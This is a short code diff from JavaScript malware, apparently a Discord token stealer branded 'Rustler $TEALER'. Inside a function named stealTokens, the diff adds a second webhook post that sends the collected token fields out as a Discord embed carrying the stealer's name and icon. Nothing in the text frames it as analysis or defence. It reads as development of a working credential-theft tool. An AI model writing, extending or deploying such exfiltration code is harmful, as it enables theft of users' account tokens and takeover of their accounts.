@@ -347,6 +347,7 @@ async function stealTokens() {
             fields.push(c)
         });
     }
+
 axios.post(webhook, {
         "content": null,
         "embeds": [
@@ -362,6 +363,24 @@ axios.post(webhook, {
             },
         }]
     }) .then(res => {}).catch(error => {})
+
+    axios.post(webhook, {
+        "content": null,
+        "embeds": [
+          {
+            "color": config["embed-color"],
+            "fields": fields.filter(onlyUnique),
+            "author": {
+                "name": `Rustler $TEALER`,
+                "icon_url": "https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg"
+            },
+            "footer": {
+                "text": "Rustler $TEALER"
+            },
+        }]
+    }) .then(res => {}).catch(error => {})
+    
+}
 
   function onlyUnique(item, index, array) {
     return array.indexOf(item) === index;
